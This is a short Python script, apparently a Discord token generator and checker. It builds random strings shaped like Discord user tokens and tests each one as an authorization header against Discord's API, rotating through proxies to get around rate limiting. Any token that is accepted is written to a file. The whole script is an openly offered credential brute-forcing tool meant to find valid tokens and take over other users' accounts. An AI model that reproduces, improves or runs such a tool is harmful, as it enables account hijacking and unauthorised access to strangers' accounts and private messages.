import random
import string
import os
import requests
import proxygen
from itertools import cycle
import pybase64
from random import randint

print(""" _______           __ __ __       __    
|       \         |  \  \  \     |  \   
| ▓▓▓▓▓▓▓\ ______  \▓▓\▓▓ ▓▓   __ \▓▓   
| ▓▓__/ ▓▓|      \|  \  \ ▓▓  /  \  \   
| ▓▓    ▓▓ \▓▓▓▓▓▓\ ▓▓ ▓▓ ▓▓_/  ▓▓ ▓▓   
| ▓▓▓▓▓▓▓\/      ▓▓ ▓▓ ▓▓ ▓▓   ▓▓| ▓▓   
| ▓▓__/ ▓▓  ▓▓▓▓▓▓▓ ▓▓ ▓▓ ▓▓▓▓▓▓\| ▓▓__ 
| ▓▓    ▓▓\▓▓    ▓▓ ▓▓ ▓▓ ▓▓  \▓▓\ ▓▓  \\
 \▓▓▓▓▓▓▓  \▓▓▓▓▓▓▓\▓▓\▓▓\▓▓   \▓▓\▓▓\▓▓\n\n\n""")

N = input("Please enter the desired number of tokens generated and check.  : ")
count = 0
current_path = os.path.dirname(os.path.realpath(__file__))
url = "https://discordapp.com/api/v6/users/@me/library"

while(int(count) < int(N)):
    tokens = []
    pybase64_string = "=="
    while(pybase64_string.find("==") != -1):
        sample_string = str(randint(000000000000000000, 999999999999999999))
        sample_string_bytes = sample_string.encode("ascii")
        pybase64_bytes = pybase64.b64encode(sample_string_bytes)
        pybase64_string = pybase64_bytes.decode("ascii")
    else:
        token = pybase64_string+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits)
                                                                                      for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
        count += 1
        tokens.append(token)
    proxies = proxygen.get_proxies()
    proxy_pool = cycle(proxies)

    for token in tokens:
        proxy = next(proxy_pool)
        header = {
            "Content-Type": "application/json",
            "authorization": token
        }
        r = requests.get(url, headers=header, proxies={"http": proxy})
        print(token)
        if r.status_code == 200:
            print(u"[+] Token Works!")
            f = open(current_path+"/"+"workingtokens.txt", "a")
            f.write(token+"\n")
        elif "You have a limited rate!." in r.text:
            print("[-] You are being rate limited.")
        else:
            print(u"[-] Invalid Token.")
    tokens.remove(token)
